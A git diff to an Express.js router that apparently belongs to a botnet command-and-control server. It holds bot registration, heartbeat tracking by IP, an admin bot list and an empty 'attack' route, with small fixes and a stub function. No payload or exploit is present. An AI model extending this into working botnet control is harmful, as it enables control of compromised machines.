@@ -1,6 +1,7 @@
 const express = require('express')
 const debug = require('debug')('server:handleRoutes')
 const chalk = require('chalk')
+const moment = require('moment')
 
 const bots = require('../controllers/bots')
 
@@ -20,12 +21,16 @@ function router() {
     try {
       var botsArray = bots.getBots()
       res.render('admin', {
-        count: botsArray.length,
+        currentTime: moment().format('L, LTS'),
         bots: botsArray
       })
     } catch (err) {
       console.log(err)
     }
+  }
+
+  async function sendFile (res,res) {
+    // res.sendFile()
   }
 
   async function landing (req, res) {
@@ -34,7 +39,6 @@ function router() {
       if (Object.keys(bot).length !== 0) {
         let added = await bots.add(bot)
         if (added) {
-          // res.sendFile()
           res.sendStatus(200)
         } else {
           res.send('Bot already exists')
@@ -50,13 +54,19 @@ function router() {
   async function attack (req, res) {
     
   }
+
   async function heartbeat (req, res) {
+    debug('HEARTBEAT')
     const { ip } = req.params
     try {
-      await bots.heartbeat(ip)
-      res.sendStatus(200)      
+      var response = await bots.heartbeat(ip)
+      if (response) {
+        res.sendStatus(200)      
+      } else {
+        res.send('Bot does not exist yet')
+      }
     } catch (error) {
-      console.log(err)
+      console.log(error)
     }
 
   }
@@ -65,7 +75,7 @@ function router() {
   routes.get('/admin', admin)
   routes.post('/landing', landing)
   routes.get('/attack', attack)
-  routes.get('/heartbeat:ip', heartbeat)
+  routes.get('/heartbeat/:ip', heartbeat)
 
   return routes
 }
